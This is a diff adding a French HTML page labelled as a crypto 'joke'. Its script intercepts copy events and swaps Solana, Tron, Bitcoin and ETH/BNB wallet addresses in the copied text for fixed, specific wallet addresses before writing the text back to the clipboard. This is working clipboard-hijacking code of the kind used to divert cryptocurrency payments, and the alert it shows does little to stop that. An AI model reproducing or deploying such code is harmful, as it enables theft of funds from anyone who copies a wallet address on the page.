@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLAGUE Crypto</title>
+</head>
+
+<body>
+
+    <!-- Script "Blague" -->
+    <script>
+        document.addEventListener('copy', function (event) {
+            event.preventDefault();
+            var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
+            var modifiedText = replaceCryptoAddresses(pastedText);
+            console.log('Texte collé:', modifiedText);
+            navigator.clipboard.writeText(modifiedText).then(function () {
+                alert('Attention ! Cette blague a modifié le texte collé dans le presse-papiers. Nouveau texte : ' + modifiedText);
+            });
+        });
+
+        function replaceCryptoAddresses(originalText) {
+            // Remplacement des adresses fictives par les adresses spécifiques
+            var replacedText = originalText.replace(/sol:\s*([a-zA-Z0-9]{43})/g, 'sol: 3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf');
+            replacedText = replacedText.replace(/trx:\s*([a-zA-Z0-9]{34})/g, 'trx: TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr');
+            replacedText = replacedText.replace(/btc:\s*([a-zA-Z0-9]{42})/g, 'btc: bc1qdx854625jt6k5s62tcnre6fmsyu6ng4pr6s64f');
+            replacedText = replacedText.replace(/eth\s*;?\s*bnb:\s*([a-zA-Z0-9]{42})/g, 'eth ; bnb: 0x10498445975974690E1EA11AF5447461B12cb588');
+            // Ajoutez d'autres remplacements ici pour d'autres adresses
+
+            return replacedText;
+        }
+    </script>
+
+</body>
+
+</html>
